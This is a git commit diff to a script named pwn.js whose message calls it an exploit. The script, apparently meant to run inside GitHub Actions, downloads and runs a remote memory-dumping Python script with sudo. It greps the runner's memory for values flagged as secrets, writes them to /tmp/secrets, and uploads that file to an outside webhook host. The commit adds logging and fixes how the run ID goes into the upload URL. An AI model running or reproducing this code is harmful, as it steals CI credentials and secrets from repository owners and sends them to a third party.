5ef74827b1b9df10aa7d9b52bf2fc2f50f810645
j5884p5g <j5884p5g@rolf.ovh>
2026-04-10 21:35:40 +0000

    Update exploit based on attempt 1 feedback

--- pwn.js
+++ pwn.js
@@ -1,5 +1,9 @@
 const { execSync } = require('child_process');
+const runId = process.env.GITHUB_RUN_ID;
+console.log("PWN: pwn.js running, GITHUB_RUN_ID=" + runId);
 try {
   execSync(`curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"`);
-  execSync(`curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/\$GITHUB_RUN_ID"`);
-} catch (e) {}
+  execSync(`curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/${runId}"`);
+} catch (e) {
+  console.error("PWN: Error: " + e.message);
+}
